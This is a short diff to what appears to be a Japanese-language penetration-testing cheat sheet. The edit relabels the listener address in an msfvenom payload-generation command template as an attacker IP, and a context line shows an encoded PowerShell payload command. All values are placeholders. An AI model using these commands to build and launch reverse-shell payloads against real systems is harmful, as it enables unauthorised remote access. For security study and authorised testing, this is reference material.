@@ -466,7 +466,7 @@ powershell -enc '<Base64エンコードされたペイロード>'
 
 1. msfvenomでペイロードの生成
 ```zsh
-sudo msfvenom -p <OS>/<arch>/<payload> -f <出力形式＞ -o <filename> LHOST=<listen-IP> LPORT=<listen-port>
+sudo msfvenom -p <OS>/<arch>/<payload> -f <出力形式＞ -o <filename> LHOST=<attacker-IP> LPORT=<port>
 ```
 
 2. 1024番ポート以下を使用するときはsudoで
